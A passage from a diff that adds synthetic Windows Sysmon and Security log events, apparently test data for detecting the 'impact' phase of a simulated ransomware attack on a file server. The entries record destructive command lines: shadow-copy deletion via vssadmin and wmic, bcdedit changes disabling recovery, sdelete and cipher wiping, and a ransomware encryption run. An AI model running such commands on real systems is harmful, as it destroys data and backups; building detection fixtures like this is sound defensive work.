+            "ParentProcessId": "7721",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T02:07:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies (Security)",
+      "sequence": 49,
+      "relative_time": "T+18:31:30",
+      "timestamp": "2026-01-31T02:31:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1ED8",
+            "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1E29",
+            "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T02:31:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Sysmon)",
+      "sequence": 50,
+      "relative_time": "T+18:56:30",
+      "timestamp": "2026-01-31T02:56:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:13:52.106",
+            "ProcessGuid": "{C257A465-FS01-0069-AF0E122D5C8B}",
+            "ProcessId": "7901",
+            "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "Hashes": "SHA256=3B7C3E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D",
+            "ParentProcessGuid": "{C257A465-FS01-0068-E048FE1D356A}",
+            "ParentProcessId": "7896",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T02:56:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Delete shadow copies via WMIC (Security)",
+      "sequence": 51,
+      "relative_time": "T+19:22:00",
+      "timestamp": "2026-01-31T03:22:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1EDD",
+            "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1ED8",
+            "CommandLine": "wmic shadowcopy delete /nointeractive",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T03:22:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Sysmon)",
+      "sequence": 52,
+      "relative_time": "T+19:48:00",
+      "timestamp": "2026-01-31T03:48:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:06.326",
+            "ProcessGuid": "{C257A465-FS01-0070-9C1128942502}",
+            "ProcessId": "8021",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0069-AF0E122D5C8B}",
+            "ParentProcessId": "7901",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T03:48:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Disable Windows recovery (Security)",
+      "sequence": 53,
+      "relative_time": "T+20:14:30",
+      "timestamp": "2026-01-31T04:14:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1F55",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1EDD",
+            "CommandLine": "bcdedit /set {default} recoveryenabled No",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T04:14:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Sysmon)",
+      "sequence": 54,
+      "relative_time": "T+20:41:30",
+      "timestamp": "2026-01-31T04:41:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:06.326",
+            "ProcessGuid": "{C257A465-FS01-0070-9C1128942502}",
+            "ProcessId": "8021",
+            "Image": "C:\\Windows\\System32\\bcdedit.exe",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0069-AF0E122D5C8B}",
+            "ParentProcessId": "7901",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T04:41:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ignore boot failures (Security)",
+      "sequence": 55,
+      "relative_time": "T+21:09:00",
+      "timestamp": "2026-01-31T05:09:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-18",
+            "SubjectUserName": "SYSTEM",
+            "SubjectDomainName": "NT AUTHORITY",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x1F55",
+            "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
+            "TokenElevationType": "%%1936",
+            "ProcessId": "0x1EDD",
+            "CommandLine": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+            "TargetUserSid": "S-1-5-18",
+            "TargetUserName": "SYSTEM",
+            "TargetDomainName": "NT AUTHORITY",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-16384"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T05:09:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Data destruction via SDelete",
+      "sequence": 56,
+      "relative_time": "T+21:37:00",
+      "timestamp": "2026-01-31T05:37:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:27.335",
+            "ProcessGuid": "{C257A465-FS01-0071-E6D8B955EAA7}",
+            "ProcessId": "8167",
+            "Image": "C:\\Windows\\System32\\sdelete64.exe",
+            "CommandLine": "sdelete64.exe -p 3 -s C:\\Users\\*\\Documents\\*",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0070-9C1128942502}",
+            "ParentProcessId": "8021",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T05:37:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Free space overwrite via cipher.exe",
+      "sequence": 57,
+      "relative_time": "T+22:05:30",
+      "timestamp": "2026-01-31T06:05:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:32.048",
+            "ProcessGuid": "{C257A465-FS01-0072-C60C0F94CBE0}",
+            "ProcessId": "8287",
+            "Image": "C:\\Windows\\System32\\cipher.exe",
+            "CommandLine": "cipher.exe /w:C:",
+            "CurrentDirectory": "C:\\Windows\\System32\\",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "IntegrityLevel": "System",
+            "ParentProcessGuid": "{C257A465-FS01-0071-E6D8B955EAA7}",
+            "ParentProcessId": "8167",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T06:05:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Sysmon)",
+      "sequence": 58,
+      "relative_time": "T+22:34:30",
+      "timestamp": "2026-01-31T06:34:30Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 1,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:37.070",
+            "ProcessGuid": "{C257A465-FS01-0073-C4A8C909F18E}",
+            "ProcessId": "8398",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\mjones\\Documents",
+            "CurrentDirectory": "C:\\Users\\Public\\",
+            "User": "EXAMPLE\\mjones",
+            "IntegrityLevel": "High",
+            "Hashes": "SHA256=BADCAFE0DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
+            "ParentProcessGuid": "{C257A465-FS01-0072-C60C0F94CBE0}",
+            "ParentProcessId": "8287",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "ParentCommandLine": "cmd.exe"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T06:34:30.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "Ransomware process execution (Security)",
+      "sequence": 59,
+      "relative_time": "T+23:04:00",
+      "timestamp": "2026-01-31T07:04:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Security",
+          "event_id": 4688,
+          "provider_name": "Microsoft-Windows-Security-Auditing",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "SubjectUserName": "mjones",
+            "SubjectDomainName": "EXAMPLE",
+            "SubjectLogonId": "0x3E7",
+            "NewProcessId": "0x20CE",
+            "NewProcessName": "C:\\Users\\Public\\ransomware.exe",
+            "TokenElevationType": "%%1937",
+            "ProcessId": "0x205F",
+            "CommandLine": "ransomware.exe --encrypt --path C:\\Users\\mjones\\Documents",
+            "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+            "TargetUserName": "mjones",
+            "TargetDomainName": "EXAMPLE",
+            "TargetLogonId": "0x3E7",
+            "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "MandatoryLabel": "S-1-16-12288"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T07:04:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    },
+    {
+      "_comment": "File encryption (ransomware)",
+      "sequence": 60,
+      "relative_time": "T+23:34:00",
+      "timestamp": "2026-01-31T07:34:00Z",
+      "log": {
+        "winlog": {
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "event_id": 11,
+          "provider_name": "Microsoft-Windows-Sysmon",
+          "computer_name": "FILESERVER01.example.local",
+          "event_data": {
+            "UtcTime": "2026-01-30 12:14:37.070",
+            "ProcessGuid": "{C257A465-FS01-0073-C4A8C909F18E}",
+            "ProcessId": "8398",
+            "Image": "C:\\Users\\Public\\ransomware.exe",
+            "TargetFilename": "C:\\Users\\mjones\\Documents\\important.encrypted",
+            "CreationUtcTime": "2026-01-30 12:14:37.070",
+            "User": "EXAMPLE\\mjones"
+          }
+        },
+        "agent": {
+          "name": "FS01",
+          "id": "004"
+        },
+        "timestamp": "2026-01-31T07:34:00.000+0000",
+        "_fomorian_test": true,
+        "_fomorian_engagement": "ransomware",
+        "_fomorian_phase": "impact"
+      }
+    }
+  ]
+}
